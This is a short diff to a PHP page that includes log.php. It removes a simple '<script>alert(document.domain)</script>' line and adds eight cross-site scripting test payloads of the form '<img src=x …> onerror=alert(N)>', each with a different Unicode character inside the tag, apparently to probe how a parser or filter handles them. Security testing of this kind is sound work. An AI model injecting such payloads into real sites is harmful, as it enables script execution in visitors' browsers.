@@ -3,8 +3,14 @@
 include 'log.php';
 
 ?>
-xss
-<script>alert(document.domain)</script>
+<img src=x ؏> onerror=alert(1551)>
+<img src=x 㣼> onerror=alert(14588)>
+<img src=x 㩏> onerror=alert(14927)>
+<img src=x 羏> onerror=alert(32655)>
+<img src=x ꘏> onerror=alert(42511)>
+<img src=x 휏> onerror=alert(55055)>
+<img src=x > onerror=alert(57423)>
+<img src=x Џ> onerror=alert(1039)>
 <!doctype html>
 <html amp lang="en">
   <head>
